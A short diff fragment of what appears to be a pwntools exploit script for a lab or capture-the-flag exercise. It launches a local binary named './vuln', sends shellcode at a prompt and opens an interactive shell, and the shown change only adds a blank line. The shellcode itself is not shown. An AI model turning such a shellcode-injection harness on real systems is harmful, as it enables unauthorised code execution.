@@ -7,4 +7,5 @@ io = process('./vuln')
 io.sendlineafter('Enter your shellcode:\n',shellcode)
 
 print io.recv()
+
 io.interactive()
